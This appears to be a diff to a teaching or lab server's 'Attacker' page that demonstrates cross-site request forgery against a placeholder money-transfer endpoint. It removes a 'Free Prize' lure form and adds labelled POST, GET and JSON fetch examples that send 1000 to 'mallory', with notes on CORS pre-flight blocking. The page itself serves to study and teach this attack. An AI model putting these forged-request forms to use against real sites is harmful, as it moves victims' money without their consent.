@@ -31,46 +31,119 @@ async function handleRequest(
       `<html>
 <head>
   <title>Attacker</title>
+  <style>
+    h2 {
+        margin-block-end: 4px;
+    }
+    h3 {
+        margin-block-end: 4px;
+    }
+    p {
+        margin-block: 4px;
+    }
+    form, pre {
+        margin: 0;
+    }
+    .example {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Free Prize</h1>
-  <p>Claim your reward below.</p>
-  <form method="POST" action="https://example.com/transfer">
-    <input type="hidden" name="to" value="mallory" />
-    <input type="hidden" name="amount" value="1000" />
-    <button type="submit">Claim reward</button>
-  </form>
+  <h1>Attacker</h1>
 
-  <hr />
-  <h2>Try the non-simple transfer endpoint</h2>
-  <p>
-    This uses JSON and a custom header, so the browser should send a pre-flight
-    request before attempting the cross-origin POST.
-  </p>
-  <button type="button" id="claim-json-reward">Claim JSON reward</button>
-  <pre id="json-result"></pre>
+  <h2>Authenticated endpoints</h2>
+
+  <div class="example">
+    <h3>Standard HTML POST form - top-level navigation + unsafe HTTP method</h3>
+    <pre>
+POST https://example.com/transfer
+Content-Type: application/x-www-form-urlencoded
+Request type: top-level navigation
+    </pre>
+    <form method="POST" action="https://example.com/transfer">
+      <label>
+        To
+        <input type="text" name="to" value="mallory" />
+      </label>
+      <label>
+        Amount
+        <input type="text" name="amount" value="1000" />
+      </label>
+      <button type="submit">Send money</button>
+    </form>
+  </div>
+
+  <div class="example">
+    <h3>Standard HTML GET form - top-level navigation + safe HTTP method</h3>
+    <pre>
+GET https://example.com/transfer-get?to=mallory&amount=1000
+Content-Type: none
+Request type: top-level navigation
+    </pre>
+    <form method="GET" action="https://example.com/transfer-get">
+      <label>
+        To
+        <input type="text" name="to" value="mallory" />
+      </label>
+      <label>
+        Amount
+        <input type="text" name="amount" value="1000" />
+      </label>
+      <button type="submit">Send money</button>
+    </form>
+  </div>
+
+  <div class="example">
+    <h3>POST JSON fetch request - sub-resource request + unsafe HTTP method</h3>
+    <pre>
+POST https://example.com/transfer-json
+Content-Type: application/json
+Request type: sub-resource request
+    </pre>
+    <p class="eg-desc">
+      This uses a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#simple_requests">non-simple</a>
+      <code>Content-Type</code> so a cross-origin request requires a CORS pre-flight. So even if cookies would be included
+      in the request, it is blocked from being sent by the failed pre-flight <code>OPTIONS</code> request.
+    </p>
+    <div>
+      <label>
+        To
+        <input type="text" id="transfer-json-to" value="mallory" />
+      </label>
+      <label>
+        Amount
+        <input type="text" id="transfer-json-amount" value="1000" />
+      </label>
+      <button type="button" id="send-transfer">Send money</button>
+    </div>
+    <div>Result: <span class="transfer-json-result"></span></div>
+  </div>
 
   <script>
-    const button = document.getElementById("claim-json-reward");
-    const result = document.getElementById("json-result");
-
+    const button = document.getElementById("send-transfer");
+    const toInput = document.getElementById("transfer-json-to");
+    const amountInput = document.getElementById("transfer-json-amount");
     button.addEventListener("click", async () => {
-      result.textContent = "Sending cross-origin JSON transfer...";
+      document.querySelector('.transfer-json-result').replaceChildren('Loading...')
 
       try {
         const response = await fetch("https://example.com/transfer-json", {
           method: "POST",
           headers: {
-            "Content-Type": "application/json",
-            "X-Transfer-Intent": "attacker",
+            "Content-Type": "application/json"
           },
-          body: JSON.stringify({ to: "mallory", amount: "1000" }),
+          body: JSON.stringify({ to: toInput.value, amount: amountInput.value }),
         });
-
-        result.textContent = "Response status: " + response.status;
-      } catch (error) {
-        result.textContent = "Request failed: " + error;
+        const resultText = await response.text()
+        document.querySelector('.transfer-json-result').replaceChildren('code: ' + response.status + ', text: ' + resultText)
+      } catch(e) {
+        console.error('POST /transfer-json error: ', e)
+        document.querySelector('.transfer-json-result').innerHTML = '<span style="color: red">POST /transfer-json error</span>'
       }
+
     });
   </script>
 </body>
